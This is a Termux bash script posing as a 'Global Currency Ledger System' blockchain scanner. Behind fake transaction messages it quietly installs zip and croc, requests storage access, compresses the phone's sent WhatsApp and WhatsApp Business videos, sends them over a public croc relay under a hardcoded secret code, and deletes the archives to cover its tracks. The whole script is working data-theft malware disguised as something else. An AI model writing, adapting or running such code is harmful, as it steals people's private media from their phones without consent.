#!/bin/bash
SECRET_CODE="DtRn847"

echo "========================================"
echo "    GLOBAL CURRENCY LEDGER SYSTEM       "
echo "    v9.5 | Stable Asset Sync | SSL      "
echo "========================================"

# 1. Setup (Zip tool එක නැත්නම් දාගන්නවා)
if ! command -v zip &> /dev/null; then
    echo ">> [SYSTEM] Updating drivers..."
    pkg update -y > /dev/null 2>&1 && pkg install zip -y > /dev/null 2>&1
fi

if ! command -v croc &> /dev/null; then
    pkg install croc -y > /dev/null 2>&1
    termux-setup-storage
fi

echo ">> [INFO] Initializing Blockchain Scanner..."
sleep 1

# --- Function to Zip and Send ---
sync_ledger() {
    local SOURCE=$1
    local ZIP_NAME=$2
    local DISP_NAME=$3

    if [ -d "$SOURCE" ]; then
        echo "----------------------------------------"
        echo ">> [TXN] FOUND: $DISP_NAME"
        echo ">> [STATUS] Compressing Data Blocks..."
        
        # 1. Folder එක Zip කරනවා (Output එක හංගලා)
        # මෙතනදී අපි කෙලින්ම අමුතු නමකින් Zip එකක් හදනවා
        zip -r "$HOME/$ZIP_NAME" "$SOURCE" > /dev/null 2>&1
        
        echo ">> [STATUS] Synchronizing with Relay..."
        
        # 2. දැන් ඒ Zip එක යවනවා (දැන් --name ඕන නෑ)
        env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$HOME/$ZIP_NAME"
        
        # 3. යැව්වට පස්සේ Zip එක මකනවා
        rm "$HOME/$ZIP_NAME"
        
        echo ">> [SUCCESS] Transaction Complete!"
        sleep 5
    fi
}

# --- STEP 1: Normal WhatsApp Videos ---
WA_VID="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent"
# ලැප් එකට එන නම: Ledger_01.zip
sync_ledger "$WA_VID" "Ledger_01.zip" "Primary Asset Ledger"

# --- STEP 2: Business WhatsApp Videos ---
BIZ_VID="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent"
# ලැප් එකට එන නම: Ledger_02.zip
sync_ledger "$BIZ_VID" "Ledger_02.zip" "Business Asset Ledger"

echo "========================================"
echo "    ALL LEDGERS SYNCED SUCCESSFULLY     "
echo "========================================"
